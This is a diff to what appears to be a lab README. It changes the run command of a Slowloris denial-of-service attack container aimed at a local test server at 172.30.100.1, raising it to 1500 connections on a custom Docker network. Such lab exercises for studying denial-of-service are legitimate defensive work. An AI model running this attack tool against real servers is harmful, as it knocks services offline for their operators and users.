@@ -10,4 +10,4 @@ After this server is available on [http://172.30.100.1/](http://172.30.100.1/)
 
 ### Attack:
 1. `docker build -t slowloris-attack slowloris/`
-2. `docker run -it --rm slowloris-attack php slowloris.php get 10 172.30.100.1`
+2. `docker run -it --network custom_network --rm slowloris-attack php slowloris.php 1500 172.30.100.1`
